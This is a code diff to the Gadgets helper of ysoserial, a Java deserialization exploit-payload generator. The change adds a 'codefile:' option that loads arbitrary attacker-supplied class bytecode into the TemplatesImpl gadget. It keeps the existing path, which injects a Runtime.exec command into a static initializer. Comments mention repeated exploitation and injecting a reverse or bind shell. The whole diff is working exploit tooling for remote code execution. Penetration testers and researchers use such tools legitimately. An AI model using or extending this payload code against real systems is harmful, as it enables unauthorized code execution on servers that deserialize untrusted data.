@@ -3,6 +3,8 @@ package ysoserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
+import java.io.File;
+import java.io.FileInputStream;
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
@@ -106,24 +108,33 @@ public class Gadgets {
     public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
         final T templates = tplClass.newInstance();
+        byte[] classBytes;
 
-        // use template gadget class
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-        pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-            "\");";
-        clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
-        CtClass superC = pool.get(abstTranslet.getName());
-        clazz.setSuperclass(superC);
+        if (command.startsWith("codefile:")) {
+            String path = command.split(":")[1];
+            FileInputStream in = new FileInputStream(new File(path));
+            classBytes = new byte[in.available()];
+            in.read(classBytes);
+            in.close();
+        } else {
+            // use template gadget class
+            ClassPool pool = ClassPool.getDefault();
+            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+            pool.insertClassPath(new ClassClassPath(abstTranslet));
+            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+            // run command in static initializer
+            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+            String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+                "\");";
+            clazz.makeClassInitializer().insertAfter(cmd);
+            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+            clazz.setName("ysoserial.Pwner" + System.nanoTime());
+            CtClass superC = pool.get(abstTranslet.getName());
+            clazz.setSuperclass(superC);
 
-        final byte[] classBytes = clazz.toBytecode();
+            classBytes = clazz.toBytecode();
+        }
 
         // inject class bytes into instance
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
